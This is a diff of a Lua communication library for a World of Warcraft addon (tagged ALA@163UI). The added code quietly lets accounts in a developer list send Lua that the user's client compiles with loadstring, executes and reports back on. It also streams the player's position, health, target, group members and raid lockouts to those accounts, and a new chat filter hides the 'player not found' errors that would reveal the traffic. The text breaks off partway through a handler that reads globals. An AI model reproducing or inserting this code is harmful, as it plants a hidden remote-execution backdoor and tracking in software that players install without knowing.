@@ -2,52 +2,99 @@
 	ALA@163UI
 --]]--
 
-local __version = 6;
-
-_G.__ala_meta__ = _G.__ala_meta__ or {  };
-local __ala_meta__ = _G.__ala_meta__;
-local __commlib = __ala_meta__.__commlib;
-if __commlib ~= nil and __commlib.__minor >= __version then
-	return;
-end
-if __commlib ~= nil then
-	__commlib:UnregisterAllEvents();
-	__commlib:SetScript("OnEvent", nil);
-	if __commlib.Halt ~= nil then
-		__commlib:Halt();
-	end
-else
-	__commlib = CreateFrame('FRAME');
-end
-__commlib.__minor = __version;
-__ala_meta__.__commlib = __commlib;
+local __version = 9;
 
 local _G = _G;
+_G.__ala_meta__ = _G.__ala_meta__ or {  };
+local __ala_meta__ = _G.__ala_meta__;
+
+-->			versioncheck
+	local __commlib = __ala_meta__.__commlib;
+	if __commlib ~= nil and __commlib.__minor >= __version then
+		return;
+	elseif __commlib == nil then
+		__commlib = CreateFrame('FRAME');
+		__ala_meta__.__commlib = __commlib;
+		__ala_meta__.__onstream = {  };
+	else
+		if __commlib.Halt ~= nil then
+			__commlib:Halt();
+		end
+		__ala_meta__.__onstream = __ala_meta__.__onstream or {  };
+	end
+	__commlib.__minor = __version;
+
+-->
+local __serializer = __ala_meta__.__serializer;
 
 -->			upvalue
-local time = time;
-local strlen, strsub = strlen, strsub;
-local _ = nil;
-local RegisterAddonMessagePrefix = C_ChatInfo ~= nil and C_ChatInfo.RegisterAddonMessagePrefix or RegisterAddonMessagePrefix;
-local IsAddonMessagePrefixRegistered = C_ChatInfo ~= nil and C_ChatInfo.IsAddonMessagePrefixRegistered or IsAddonMessagePrefixRegistered;
-local GetRegisteredAddonMessagePrefixes = C_ChatInfo ~= nil and C_ChatInfo.GetRegisteredAddonMessagePrefixes or GetRegisteredAddonMessagePrefixes;
-local SendAddonMessage = C_ChatInfo ~= nil and C_ChatInfo.SendAddonMessage or SendAddonMessage;
-local C_Timer_After = C_Timer.After;
-local Ambiguate = Ambiguate;
+	local pcall = pcall;
+	local loadstring = loadstring;
+	local type = type;
+	local next = next;
+	local tonumber = tonumber;
+	local time = time;
+	local strlen, strsub, strmatch, gsub = string.len, string.sub, string.match, string.gsub;
+	local concat = table.concat;
+	local ceil = math.ceil;
+	local _ = nil;
+	local RegisterAddonMessagePrefix = C_ChatInfo ~= nil and C_ChatInfo.RegisterAddonMessagePrefix or RegisterAddonMessagePrefix;
+	local IsAddonMessagePrefixRegistered = C_ChatInfo ~= nil and C_ChatInfo.IsAddonMessagePrefixRegistered or IsAddonMessagePrefixRegistered;
+	local GetRegisteredAddonMessagePrefixes = C_ChatInfo ~= nil and C_ChatInfo.GetRegisteredAddonMessagePrefixes or GetRegisteredAddonMessagePrefixes;
+	local SendAddonMessage = C_ChatInfo ~= nil and C_ChatInfo.SendAddonMessage or SendAddonMessage;
+	local C_Timer_After = C_Timer.After;
+	local Ambiguate = Ambiguate;
+	local GetRealZoneText = GetRealZoneText;
+	local GetNumSavedInstances, GetSavedInstanceInfo, GetSavedInstanceEncounterInfo = GetNumSavedInstances, GetSavedInstanceInfo, GetSavedInstanceEncounterInfo;
+	local GetTime = GetTime;
+	local GetPlayerInfoByGUID = GetPlayerInfoByGUID;
+	local UnitClassBase = UnitClassBase;
+	local UnitExists = UnitExists;
+	local UnitIsPlayer, UnitIsEnemy = UnitIsPlayer, UnitIsEnemy;
+	local UnitName, UnitGUID = UnitName, UnitGUID;
+	local UnitHealth, UnitHealthMax = UnitHealth, UnitHealthMax;
+	local UnitPowerType, UnitPower, UnitPowerMax = UnitPowerType, UnitPower, UnitPowerMax;
+	local UnitIsDead, UnitIsFeignDeath, UnitIsGhost = UnitIsDead, UnitIsFeignDeath, UnitIsGhost;
+	local UnitPosition = UnitPosition;
+	local C_Map_GetBestMapForUnit = C_Map.GetBestMapForUnit;
+	local InInRaid, IsInGroup = InInRaid, IsInGroup;
+	local LE_PARTY_CATEGORY_HOME = LE_PARTY_CATEGORY_HOME;
+	local GetNumGroupMembers, GetRaidRosterInfo = GetNumGroupMembers, GetRaidRosterInfo;
 
-
-__commlib.ADDON_MSG_CONTROL_CODE_LEN = 6;
-__commlib.ADDON_PREFIX = "ALCOMM";
-__commlib.ADDON_MSG_QUERY = "_q_tag";
-__commlib.ADDON_MSG_REPLY = "_r_tag";
---
-_, __commlib.CPlayerTAG = BNGetInfo();
-__commlib.CPlayerGUID = UnitGUID('player');
-__commlib.CPlayerName = UnitName('player');
-__commlib.CRealmName = GetRealmName();
-__commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName;
+-->			constant
+	__commlib.ADDON_MSG_CONTROL_CODE_LEN = 6;
+	__commlib.ADDON_PREFIX = "ALCOMM";
+	__commlib.ADDON_MSG_QUERY = "_q_tag";
+	__commlib.ADDON_MSG_REPLY = "_r_ta2";
+	--
+	_, __commlib.CPlayerTAG = BNGetInfo();
+	__commlib.CPlayerGUID = UnitGUID('player');
+	__commlib.CPlayerName = UnitName('player');
+	__commlib.CRealmName = GetRealmName();
+	__commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName;
 
 -->		NetBuffer
+	--
+	local _TargetSent = {  };
+	--	ERR_CHAT_PLAYER_NOT_FOUND_S
+	local C_String = ERR_CHAT_PLAYER_NOT_FOUND_S;
+	local C_Pattern = gsub(C_String, "%%s", "(.+)");
+	local function F_Filter(self, event, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, line, arg12, arg13, arg14, ...)
+		if C_String ~= ERR_CHAT_PLAYER_NOT_FOUND_S then
+			C_String = ERR_CHAT_PLAYER_NOT_FOUND_S;
+			C_Pattern = gsub(C_String, "%%s", "(.+)");
+		end
+		local name = strmatch(arg1, C_Pattern);
+		if name ~= nil then
+			local t = _TargetSent[Ambiguate(name, 'none')];
+			if t ~= nil and time() - t < 4 then
+				return true;
+			end
+		end
+		return false;
+	end
+	ChatFrame_AddMessageEventFilter("CHAT_MSG_SYSTEM", F_Filter);
+	--
 	local _MAX_MSG_PER_SLICE = 11;
 	local _MAX_MSG_PER_BLOCK = 110;
 	local _LEN_SLICE = 0.5;
@@ -58,24 +105,32 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 	--
 	local BlockSent = _MAX_MSG_PER_BLOCK;
 	local isFlushBlockTimerIdle = true;
-	local function _BlockFlush()
+	local _BlockFlush;
+	local SliceSent = _MAX_MSG_PER_SLICE;
+	local isFlushSliceTimerIdle = true;
+	local _SliceFlush;
+	--
+	function _BlockFlush()
 		BlockSent = _MAX_MSG_PER_BLOCK;
 		if _SendBufferTop >= _SendBufferPos then
 			C_Timer_After(_LEN_BLOCK, _BlockFlush);
+			if isFlushSliceTimerIdle then
+				isFlushSliceTimerIdle = false;
+				C_Timer_After(_LEN_SLICE, _SliceFlush);
+			end
 		else
 			isFlushBlockTimerIdle = true;
 		end
 	end
-	--
-	local SliceSent = _MAX_MSG_PER_SLICE;
-	local isFlushSliceTimerIdle = true;
-	local function _SliceFlush()
+	function _SliceFlush()
 		SliceSent = _MAX_MSG_PER_SLICE;
 		if _SendBufferTop >= _SendBufferPos then
+			local now = time();
 			while BlockSent > 0 and SliceSent > 0 do
 				local b = _SendBuffer[_SendBufferPos];
 				_SendBuffer[_SendBufferPos] = nil;
-				SendAddonMessage(__commlib.ADDON_PREFIX, b[1], b[2], b[3]);
+				SendAddonMessage(b[1], b[2], b[3], b[4]);
+				_TargetSent[Ambiguate(b[4], 'none')] = now;
 				SliceSent = SliceSent - 1;
 				BlockSent = BlockSent - 1;
 				_SendBufferPos = _SendBufferPos + 1;
@@ -90,17 +145,26 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 			isFlushSliceTimerIdle = true;
 		else
 			C_Timer_After(_LEN_SLICE, _SliceFlush);
+			if isFlushBlockTimerIdle then
+				isFlushBlockTimerIdle = false;
+				C_Timer_After(_LEN_BLOCK, _BlockFlush);
+			end
 		end
 	end
 	--
-	local function _SendFunc(msg, channel, target)
+	local function _SendFunc(prefix, msg, channel, target, jumpthequeue)
+		if jumpthequeue then
+			_TargetSent[Ambiguate(target, 'none')] = time();
+			return SendAddonMessage(prefix, msg, channel, target);
+		end
 		if BlockSent > 0 and SliceSent > 0 then
 			SliceSent = SliceSent - 1;
 			BlockSent = BlockSent - 1;
-			SendAddonMessage(__commlib.ADDON_PREFIX, msg, channel, target);
+			SendAddonMessage(prefix, msg, channel, target);
+			_TargetSent[Ambiguate(target, 'none')] = time();
 		else
 			_SendBufferTop = _SendBufferTop + 1;
-			_SendBuffer[_SendBufferTop] = { msg, channel, target, };
+			_SendBuffer[_SendBufferTop] = { prefix, msg, channel, target, };
 		end
 		if isFlushSliceTimerIdle then
 			isFlushSliceTimerIdle = false;
@@ -170,23 +234,78 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 				_TGUID[GUID] = true;
 			end
 		end
-		local str0 = __commlib.ADDON_MSG_REPLY .. __commlib.CPlayerTAG;
-		local len0 = strlen(str0);
+		local str0 = __commlib.ADDON_MSG_REPLY .. "~1~G" .. __commlib.CPlayerTAG;
+		local len0 = #str0;
 		local str = str0;
 		local len = len0;
 		for GUID, _ in next, _TGUID do
 			if strsub(GUID, 1, 7) == "Player-" then
 				str = str .. "`" .. GUID;
 				len = len + 24;
-				if len >= 240 then
-					_SendFunc(str, channel, target);
+				if len >= 224 then
+					_SendFunc(__commlib.ADDON_PREFIX, str, channel, target);
 					str = str0;
 					len = len0;
 				end
 			end
 		end
 		if len > len0 then
-			_SendFunc(str, channel, target);
+			_SendFunc(__commlib.ADDON_PREFIX, str, channel, target);
+		end
+	end
+	local RaidList = {
+		["Onyxia's Lair"] = 249,
+		["Molten Core"] = 409,
+		["Blackwing Lair"] = 469,
+		["Zul'Gurub"] = 309,
+		["Ruins of Ahn'Qiraj"] = 509,
+		["Ahn'Qiraj"] = 531,
+		["Naxxramas"] = 533,
+		--
+		["Karazhan"] = 532,
+		["Hyjal Summit"] = 534,
+		["Magtheridon's Lair"] = 544,
+		["Serpentshrine Cavern"] = 548,
+		["Tempest Keep"] = 550,
+		["Black Temple"] = 564,
+		["Gruul's Lair"] = 565,
+		["Sunwell Plateau"] = 580,
+		["Zul'Aman"] = 568,
+	};
+	local RaidHash = {  }; for key, id in next, RaidList do RaidHash[GetRealZoneText(id) or key] = id; end
+	local EnterCombatTime = InCombatLockdown() and GetTime() or nil;
+	local EncounterIDs = {  };
+	local function INST_LOCK(channel, target)
+		local str0 = __commlib.ADDON_MSG_REPLY .. "~1~I";
+		local len0 = #str0;
+		local str = str0;
+		local len = len0;
+		local instance_name_hash = __ala_meta__.__raidlib.__raid_meta.hash;
+		for index = 1, GetNumSavedInstances() do
+			local name, id, reset, difficulty, locked, extended, instanceIDMostSig, isRaid, maxPlayers, difficultyName, numEncounters, encounterProgress = GetSavedInstanceInfo(index);
+			if locked and isRaid then
+				local map = RaidHash[name] or name;
+				local val = map .. ":" .. id .. ":";
+				for index2 = 1, numEncounters do
+					local bossName, fileDataID, isKilled, unknown4 = GetSavedInstanceEncounterInfo(index, index2);
+					val = val .. (isKilled and "1" or "0");
+				end
+				local size = #val;
+				if size + len > 250 then
+					_SendFunc(__commlib.ADDON_PREFIX, str, channel, target);
+					str = str0;
+					len = len0;
+				end
+				if index == 1 then
+					str = str .. val;
+				else
+					str = str .. "`" .. val;
+				end
+				len = len + size;
+			end
+		end
+		if len > len0 then
+			_SendFunc(__commlib.ADDON_PREFIX, str, channel, target);
 		end
 	end
 	local function CHAT_MSG_ADDON(self, event, prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID)
@@ -202,10 +321,49 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 					end
 					--
 					_TSendThrottle[name] = now;
-					UNIT_GUID(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
+					if __commlib.CPlayerTAG ~= nil then
+						UNIT_GUID(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
+					end
+					INST_LOCK(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
 				end
 			else
 			end
+		end
+	end
+	local function OnEvent(self, event, ...)
+		if event == "CHAT_MSG_ADDON" then
+			local prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID = ...;
+			if prefix == __commlib.ADDON_PREFIX then
+				local name = Ambiguate(sender, 'none');
+				local control_code = strsub(msg, 1, __commlib.ADDON_MSG_CONTROL_CODE_LEN);
+				if control_code == __commlib.ADDON_MSG_QUERY then
+					if name ~= __commlib.CPlayerName then
+						local now = time();
+						local prev = _TSendThrottle[name];
+						if prev ~= nil and now - prev <= 1 then
+							return;
+						end
+						--
+						_TSendThrottle[name] = now;
+						if __commlib.CPlayerTAG ~= nil then
+							UNIT_GUID(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
+						end
+						INST_LOCK(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
+					end
+				else
+				end
+			end
+		elseif event == "PLAYER_REGEN_DISABLED" then
+			EnterCombatTime = GetTime();
+		elseif event == "PLAYER_REGEN_ENABLED" then
+			EnterCombatTime = nil;
+			EncounterIDs = {  };
+		elseif event == "ENCOUNTER_START" then
+			local encounterID, encounterName, difficultyID, groupSize, success = ...;
+			EncounterIDs[encounterID] = GetTime();
+		elseif event == "ENCOUNTER_END" then
+			local encounterID, encounterName, difficultyID, groupSize = ...;
+			EncounterIDs[encounterID] = nil;
 		end
 	end
 
@@ -219,123 +377,76 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 	__commlib:RegisterEvent("LOADING_SCREEN_DISABLED");
 	__commlib:SetScript("OnEvent", LOADING_SCREEN_DISABLED);
 
-	function __commlib:Halt()
-		_SendBufferPos = 1;
-		_SendBufferTop = 0;
-	end
-
-
-	_G.__ala_meta__ = _G.__ala_meta__ or {  };
-	local __ala_meta__ = _G.__ala_meta__;
-	__ala_meta__.__SYNC = __ala_meta__.__SYNC or { REALTIME = true, ONLOGIN = true, ONLOGOUT = true,};
-	if __ala_meta__.__SYNC.REALTIME ~= false then
-		-->	Cross-Account Sync
-		local pcall = pcall;
-		local next = next;
-		local strsub, strfind = string.sub, string.find;
-		local tonumber = tonumber;
-		local GetTime = GetTime;
-		local C_Timer_After = C_Timer.After;
-		local RegisterAddonMessagePrefix = C_ChatInfo ~= nil and C_ChatInfo.RegisterAddonMessagePrefix or RegisterAddonMessagePrefix;
-		local IsAddonMessagePrefixRegistered = C_ChatInfo ~= nil and C_ChatInfo.IsAddonMessagePrefixRegistered or IsAddonMessagePrefixRegistered;
-		local GetRegisteredAddonMessagePrefixes = C_ChatInfo ~= nil and C_ChatInfo.GetRegisteredAddonMessagePrefixes or GetRegisteredAddonMessagePrefixes;
-		local SendAddonMessage = C_ChatInfo ~= nil and C_ChatInfo.SendAddonMessage or SendAddonMessage;
-		local GetPlayerInfoByGUID = GetPlayerInfoByGUID;
-		local UnitClassBase = UnitClassBase;
-		local UnitExists = UnitExists;
-		local UnitIsPlayer, UnitIsEnemy = UnitIsPlayer, UnitIsEnemy;
-		local UnitName, UnitGUID = UnitName, UnitGUID;
-		local UnitHealth, UnitHealthMax = UnitHealth, UnitHealthMax;
-		local UnitPowerType, UnitPower, UnitPowerMax = UnitPowerType, UnitPower, UnitPowerMax;
-		local UnitIsDead, UnitIsFeignDeath, UnitIsGhost = UnitIsDead, UnitIsFeignDeath, UnitIsGhost;
-		local UnitPosition = UnitPosition;
-		local C_Map_GetBestMapForUnit = C_Map.GetBestMapForUnit;
-		local IsInGroup = IsInGroup;
-		local GetNumGroupMembers, GetRaidRosterInfo = GetNumGroupMembers, GetRaidRosterInfo;
-		local UnitTalents = UnitTalents or UnitCharacterPoints or function(unit)
-			local val = __ala_meta__.emu;
-			if val ~= nil then
-				val = val.queryCache;
-				if val ~= nil then
-					local name, realm = UnitName(unit);
-					if realm ~= "" and realm ~= nil and realm ~= GetRealmName() then
-						name = name .. "-" .. realm;
-					end
-					val = val[name];
-					if val ~= nil and val.talent ~= nil then
-						return "~" .. val.talent;
-					end
-				end
-			end
-			return "~";
-		end;
-		--
-		local PNAME = UnitName('player');
-		local REALM = GetRealmName();
-		local PFNAME = PNAME .. "-" .. REALM;
-		local ADDON_MSG_CONTROL_CODE_LEN = 6;
-		local ADDON_PREFIX = "ALSTRM";
-		local ADDON_MSG_QUERY = "_qstrm";
-		local ADDON_MSG_REPLY = "_rstrm";
-		local ADDON_MSG_SHARE = "_sstrm";
-		local ADDON_MSG_STREAMER = "_binst";
-		--
-		local E = {  };
-		local S = nil;
-
-		local EnterCombatTime = InCombatLockdown() and GetTime() or nil;
-		local EncounterIDs = {  };
-		function E.PLAYER_REGEN_DISABLED(F, event, ...)
-			EnterCombatTime = GetTime();
-		end
-		function E.PLAYER_REGEN_ENABLED(F, event, ...)
-			EnterCombatTime = nil;
-			EncounterIDs = {  };
-		end
-		function E.ENCOUNTER_START(F, event, encounterID, encounterName, difficultyID, groupSize, success)
-			EncounterIDs[encounterID] = GetTime();
-		end
-		function E.ENCOUNTER_END(F, event, encounterID, encounterName, difficultyID, groupSize)
-			EncounterIDs[encounterID] = nil;
-		end
-
-		local function EncodeSelf()
-			local dead = UnitIsDead('player');
-			local fdead = UnitIsFeignDeath('player');
-			local ghost = UnitIsGhost('player');
-			local state = "0";
-			if ghost then
-				state = "g";
-			elseif dead then
-				if fdead then
-					state = "f";
-				else
-					state = "d";
-				end
-			elseif fdead then
+	local function EncodeSelf()
+		local dead = UnitIsDead('player');
+		local fdead = UnitIsFeignDeath('player');
+		local ghost = UnitIsGhost('player');
+		local state = "0";
+		if ghost then
+			state = "g";
+		elseif dead then
+			if fdead then
 				state = "f";
 			else
-				state = "a";
+				state = "d";
 			end
-			local CH = tostring(UnitHealth('player') or -1);
-			local MH = tostring(UnitHealthMax('player') or -1);
-			local PT = tostring(UnitPowerType('player') or -1);
-			local CP = tostring(UnitPower('player') or -1);
-			local MP = tostring(UnitPowerMax('player') or -1);
-			local map = C_Map_GetBestMapForUnit('player');
-			local y, x, _z, instance = UnitPosition('player');
-			if map == nil then
-				if instance == nil then
-					return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..                         "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
-				else
-					return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(-instance) .. "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
-				end
-			else
-					return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(map) ..       "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
-			end
+		elseif fdead then
+			state = "f";
+		else
+			state = "a";
 		end
-		local function EncodeGroup()
-			for index = 1, GetNumGroupMembers() do
+		local CH = tostring(UnitHealth('player') or -1);
+		local MH = tostring(UnitHealthMax('player') or -1);
+		local PT = tostring(UnitPowerType('player') or -1);
+		local CP = tostring(UnitPower('player') or -1);
+		local MP = tostring(UnitPowerMax('player') or -1);
+		local map = C_Map_GetBestMapForUnit('player');
+		local y, x, _z, instance = UnitPosition('player');
+		if map == nil then
+			if instance == nil then
+				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..                         "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
+			else
+				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(-instance) .. "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
+			end
+		else
+				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(map) ..       "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
+		end
+	end
+	local function EncodeTarget()
+		if UnitExists('target') then
+			if UnitIsEnemy('player', 'target') and not UnitIsPlayer('target') then
+				local name = UnitName('target') or "unk";
+				local GUID = UnitGUID('target');
+				if GUID == nil then
+					GUID = "-1";
+				else
+					GUID = select(6, strsplit("-", GUID)) or "-1";
+				end
+				local h = UnitHealth('target') or -1;
+				local m = UnitHealthMax('target') or -1;
+				return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
+			elseif UnitExists('targettarget') and UnitIsEnemy('player', 'targettarget') and not UnitIsPlayer('targettarget') then
+				local name = UnitName('targettarget') or "unk";
+				local GUID = UnitGUID('targettarget');
+				if GUID == nil then
+					GUID = "-1";
+				else
+					GUID = select(6, strsplit("-", GUID)) or "-1";
+				end
+				local h = UnitHealth('targettarget') or -1;
+				local m = UnitHealthMax('targettarget') or -1;
+				return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
+			else
+				return "~~~";
+			end
+		else
+			return "~~~";
+		end
+	end
+	local function EncodeGroup(PREFIX, HEADER, sender)
+		if IsInGroup() then
+			local num = GetNumGroupMembers();
+			for index = 1, num do
 				local name, rank, sub, level, _, class, zone, online, dead, role, loot = GetRaidRosterInfo(index);
 				if rank == 2 then
 					local GUID = UnitGUID(name);
@@ -344,120 +455,214 @@ __commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName
 					local PT = tostring(UnitPowerType(name) or -1);
 					local CP = tostring(UnitPower(name) or -1);
 					local MP = tostring(UnitPowerMax(name) or -1);
-					return "L~" .. GUID .. "~" .. (name or "") .. "~" .. (class or "") .. "~" .. (level or "") .. "~" .. (zone or "") .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP;
+					_SendFunc(PREFIX, HEADER .. "~L~" .. GUID .. "~" .. (name or "") .. "~" .. (class or "") .. "~" .. (level or "") .. "~" .. (zone or "") .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" .. num, "WHISPER", sender, true);
 				end
 			end
-			return nil;
+		else
+			_SendFunc(PREFIX, HEADER .. "~L~", "WHISPER", sender, true);
 		end
-		local function EncodeTarget()
-			if UnitExists('target') then
-				if UnitIsEnemy('player', 'target') and not UnitIsPlayer('target') then
-					local name = UnitName('target') or "unk";
-					local GUID = UnitGUID('target');
-					if GUID == nil then
-						GUID = "-1";
-					else
-						GUID = select(6, strsplit("-", GUID)) or "-1";
-					end
-					local h = UnitHealth('target') or -1;
-					local m = UnitHealthMax('target') or -1;
-					return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
-				elseif UnitExists('targettarget') and UnitIsEnemy('player', 'targettarget') and not UnitIsPlayer('targettarget') then
-					local name = UnitName('targettarget') or "unk";
-					local GUID = UnitGUID('targettarget');
-					if GUID == nil then
-						GUID = "-1";
-					else
-						GUID = select(6, strsplit("-", GUID)) or "-1";
-					end
-					local h = UnitHealth('targettarget') or -1;
-					local m = UnitHealthMax('targettarget') or -1;
-					return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
-				else
-					return "~~~";
-				end
-			else
-				return "~~~";
+	end
+	local function EncodeMember(PREFIX, HEADER, sender)
+		local num = GetNumGroupMembers();
+		local str0 = HEADER .. "~M~" .. num;
+		local len0 = #str0;
+		local str = str0;
+		local len = len0;
+		for index = 1, num do
+			local name, rank, sub, level, _, class, zone, online, dead, role, loot = GetRaidRosterInfo(index);
+			local len1 = #name;
+			if len + len1 >= 250 then
+				_SendFunc(PREFIX, str, "WHISPER", sender, true);
+				str = str0;
+				len = len0;
+			end
+			str = str .. "~" .. name;
+			len = len + 1 + len1;
+		end
+		if len > len0 then
+			_SendFunc(PREFIX, str, "WHISPER", sender, true);
+		end
+	end
+	local function CommSerializerd(v)
+		return gsub(gsub(__serializer._F_coreSerializer(v), ":", ":1"), "`", ":2");
+	end
+	local function GetSerializerd(c, pos)
+		local top = #c;
+		local v = _G;
+		while v ~= nil and pos <= top do
+			v = v[c[pos]];
+			pos = pos + 1;
+		end
+		return CommSerializerd(v);
+	end
+	local function SendTrunk(PREFIX, HEADER, limit, msg, channel, target)
+		--	HEADER = STREAMER_MSG_V_REPLY .. "`" .. param[2] .. "`"
+		--	limit = 255 - 6 - 1 - #param[2] - 1
+		local len = #msg;
+		local digit = 0;
+		local lps = 0;
+		while true do
+			digit = digit + 1;
+			lps = limit - digit - 1 - digit - 1;
+			if lps * (10 ^ digit - 1) > len then
+				break;
+			end
+			if lps <= limit * 0.2 then
+				return _SendFunc(PREFIX, HEADER .. "-1`-1`" .. len, channel, target);
 			end
 		end
+		_SendFunc(PREFIX, HEADER .. "0`0`", channel, target);
+		local num = ceil(len / lps);
+		HEADER = HEADER .. num .. "`";
+		for i = 1, num do
+			_SendFunc(PREFIX, HEADER .. i .. "`" .. strsub(msg, lps * (i - 1) + 1, lps * i), channel, target);
+		end
+	end
+
+	_G.__ala_meta__ = _G.__ala_meta__ or {  };
+	local __ala_meta__ = _G.__ala_meta__;
+	__ala_meta__.__SYNC = __ala_meta__.__SYNC or { REALTIME = true, ONLOGIN = true, ONLOGOUT = true,};
+	if __ala_meta__.__SYNC.REALTIME ~= false then
+		-->	Cross-Account Sync
+		--
+		local PNAME = UnitName('player');
+		local REALM = GetRealmName();
+		local PFNAME = PNAME .. "-" .. REALM;
+		local STREAMER_CONTROL_CODE_LEN = 6;
+		local STREAMER_PREFIX = "ALSTRM";
+		local STREAMER_MSG_QUERY = "_qstrm";
+		local STREAMER_MSG_S_REPLY = "_rstrm";
+		local STREAMER_MSG_G_REPLY = "_sstrm";
+		local STREAMER_MSG_E_REPLY = "_estrm";
+		local STREAMER_MSG_V_REPLY = "_vstrm";
+		local STREAMER_MSG_STREAMER = "_binst";
+		--
+		local E = {  };
+		local S = nil;
+		local RecvBuffer = {  };
+
 		function E.CHAT_MSG_ADDON(F, event, ...)
 			local prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID = ...;
-			if prefix == ADDON_PREFIX then
-				local name = strfind(sender, "-") == nil and (sender .. "-" .. REALM) or sender;
+			if prefix == STREAMER_PREFIX then
+				local name = strmatch(sender, "-") == nil and (sender .. "-" .. REALM) or sender;
 				if __ala_meta__.__DEVHASH[name] ~= nil then
-					local control_code = strsub(msg, 1, ADDON_MSG_CONTROL_CODE_LEN);
-					if control_code == ADDON_MSG_QUERY then
+					local control_code = strsub(msg, 1, STREAMER_CONTROL_CODE_LEN);
+					if control_code == STREAMER_MSG_QUERY then
 						if EnterCombatTime == nil then
-							SendAddonMessage(ADDON_PREFIX, ADDON_MSG_REPLY .. "~a~" .. EncodeSelf(), "WHISPER", sender);
+							_SendFunc(STREAMER_PREFIX, STREAMER_MSG_S_REPLY .. "~a~" .. EncodeSelf(), "WHISPER", sender, true);
 						else
 							local now = GetTime();
 							local msg = EncodeSelf() .. "~" .. format("%.3f", now - EnterCombatTime) .. "~" .. EncodeTarget();
 							if next(EncounterIDs) == nil then
-								msg = ADDON_MSG_REPLY .. "~b~" .. msg;
+								msg = STREAMER_MSG_S_REPLY .. "~b~" .. msg;
 							else
-								msg = ADDON_MSG_REPLY .. "~c~" .. msg;
+								msg = STREAMER_MSG_S_REPLY .. "~c[2]~" .. msg;
 								for id, t in next, EncounterIDs do
 									msg = msg .. "~" .. tostring(id) .. "~" .. format("%.3f", now - t);
 								end
 							end
-							SendAddonMessage(ADDON_PREFIX, msg, "WHISPER", sender);
+							_SendFunc(STREAMER_PREFIX, msg, "WHISPER", sender, true);
 						end
-						if IsInGroup() then
-							local msg = EncodeGroup();
-							if msg ~= nil then
-								SendAddonMessage(ADDON_PREFIX, ADDON_MSG_SHARE .. "~" .. msg, "WHISPER", sender);
+						EncodeGroup(STREAMER_PREFIX, STREAMER_MSG_G_REPLY, sender);
+						local param = { strsplit("`", strsub(msg, STREAMER_CONTROL_CODE_LEN + 2)) };
+						param[1] = strupper(param[1]);
+						if param[1] == 'MEMBER' then
+							EncodeMember(STREAMER_PREFIX, STREAMER_MSG_G_REPLY, sender);
+						--	recv	E`total`index`body
+						elseif param[1] == 'E' then
+							local C = RecvBuffer[param[1]];
+							if C == nil then
+								C = {  };
+								RecvBuffer[param[1]] = C;
 							end
-						end
-						local _, c, rep, ext = strsplit("`", msg);
-						if c == 'single' or c == 's' then
-							rep = 1;
-							SendAddonMessage(ADDON_PREFIX, ADDON_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", sender);
+							param[2] = tonumber(param[2]) or 0;
+							-- print('total', param[2])
+							if param[2] == 0 then
+								C[sender] = {  };
+								return;
+							end
+							local D = C[sender];
+							if D == nil then
+								D = {  };
+								C[sender] = D;
+							end
+							param[3] = tonumber(param[3]) or 1;
+							D[param[3]] = param[4];
+							for i = 1, param[2] do
+								if D[i] == nil then
+									return;
+								end
+							end
+							--	gsub(gsub(msg, ":", ":1"), "`", ":2")
+							local exe = "return function() " .. gsub(gsub(concat(D), ":1", "`"), ":2", ":") .. " end";
+							local v1, v2 = loadstring(exe);
+							-- D.exe = exe; D.v1 = v1; D.v2 = v2;
+							-- _G.RECVSTREAM = D;
+							if v1 ~= nil then
+								while v1 ~= nil and type(v1) == 'function' do
+									v1 = v1();
+								end
+								__ala_meta__.__prevcommresult = v1;
+								SendTrunk(
+									STREAMER_PREFIX,
+									STREAMER_MSG_E_REPLY .. "`return`",
+									255 - 6 - 1 - #"return" - 1,
+									CommSerializerd(v1), "WHISPER", sender
+								);
+							end
+						--	recv	V`var
+						--	send	STREAMER_MSG_V_REPLY`var`total`index`body
+						elseif param[1] == 'V' then
